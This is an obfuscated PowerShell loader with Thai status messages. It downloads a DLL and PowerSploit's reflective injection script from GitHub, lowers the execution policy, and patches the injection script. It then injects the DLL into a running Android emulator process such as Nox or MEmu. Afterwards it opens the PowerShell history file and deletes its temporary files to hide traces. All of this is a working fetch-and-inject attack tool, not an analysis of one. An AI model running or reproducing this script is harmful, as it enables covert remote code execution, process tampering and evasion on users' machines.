
$_0x91A = @(
"https://raw",
".githubusercontent",
".com/malachixxx",
"/testdll/main/",
"dbghelp.dll"
) -join ""

$_0xB2F = Join-Path $env:TEMP (@("dbg","help",".dll") -join "")

Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force -ErrorAction SilentlyContinue

$_0x7C1 = New-Object (@("System",".Net",".WebClient") -join "")
$_0x7C1.Headers.Add((@("User","-Agent") -join ""), (@("Moz","illa/","5.0") -join ""))

$_0x5F9 = $_0x7C1.DownloadData($_0x91A)

$_0x3D2 = @(
"https://raw",
".githubusercontent",
".com/PowerShellMafia",
"/PowerSploit/master",
"/CodeExecution/",
"Invoke-ReflectivePEInjection.ps1"
) -join ""

$_0x8E4 = "$env:TEMP\Reflective_$(Get-Random).ps1"

Invoke-WebRequest -Uri $_0x3D2 -OutFile $_0x8E4 -UseBasicParsing

$_0xA77 = Get-Content $_0x8E4 -Raw

$_0xA77 = $_0xA77 -replace '\$GetProcAddress\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetProcAddress''\)', '$GetProcAddress = $UnsafeNativeMethods.GetMethod(''GetProcAddress'', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))'

$_0xA77 = $_0xA77 -replace '\$GetModuleHandle\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetModuleHandle''\)', '$GetModuleHandle = $UnsafeNativeMethods.GetMethod(''GetModuleHandle'', [Type[]]@([String]))'

$_0xC11 = "$env:TEMP\Reflective_fixed.ps1"

$_0xA77 | Set-Content $_0xC11 -Encoding UTF8

. $_0xC11

$_0xProcNames = @("Nox", "AndroidProcess", "LdVBoxHeadless", "MEmuHeadless", "HD-Player")

$_0xFound = @()
foreach ($_0xN in $_0xProcNames) {
    $_0xP = Get-Process -Name $_0xN -ErrorAction SilentlyContinue
    if ($_0xP) {
        foreach ($_0xPi in $_0xP) {
            $_0xFound += [PSCustomObject]@{ Name = $_0xN; PID = $_0xPi.Id }
        }
    }
}

if ($_0xFound.Count -eq 0) {
    Write-Host "[-] ไม่พบ process เป้าหมายที่รันอยู่" -ForegroundColor Red
    exit
}

$_0xWarn = @("HD-Player", "AndroidProcess")
$_0xWarnFound = $_0xFound | Where-Object { $_0xWarn -contains $_.Name }
$_0xSafeFound = $_0xFound | Where-Object { $_0xWarn -notcontains $_.Name }

if ($_0xWarnFound) {
    foreach ($_0xW in $_0xWarnFound) {
        Write-Host "[!] พบ $($_0xW.Name) (PID: $($_0xW.PID)) - อาจ inject ไม่ติด ข้ามไป" -ForegroundColor Yellow
    }
}

if ($_0xSafeFound.Count -eq 0) {
    Write-Host "[-] ไม่มี process ที่ inject ได้แน่นอน (มีแค่ HD-Player/AndroidProcess)" -ForegroundColor Red
    exit
} elseif ($_0xSafeFound.Count -eq 1) {
    $_0x2AA = $_0xSafeFound[0].PID
    Write-Host "[+] พบ $($_0xSafeFound[0].Name) (PID: $_0x2AA) - กำลัง inject..." -ForegroundColor Green
    Invoke-ReflectivePEInjection -PEBytes $_0x5F9 -ProcId $_0x2AA
} else {
    Write-Host "[-] พบหลาย process ที่รันพร้อมกัน ไม่สามารถเลือกอัตโนมัติได้:" -ForegroundColor Red
    foreach ($_0xS in $_0xSafeFound) {
        Write-Host "    $($_0xS.Name) (PID: $($_0xS.PID))" -ForegroundColor Cyan
    }
    exit
}

notepad "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

Remove-Item $_0xB2F -Force -ErrorAction SilentlyContinue

Get-ChildItem (@("$env:TEMP","/Reflective_*.ps1") -join "") -ErrorAction SilentlyContinue |
Remove-Item -Force -ErrorAction SilentlyContinue
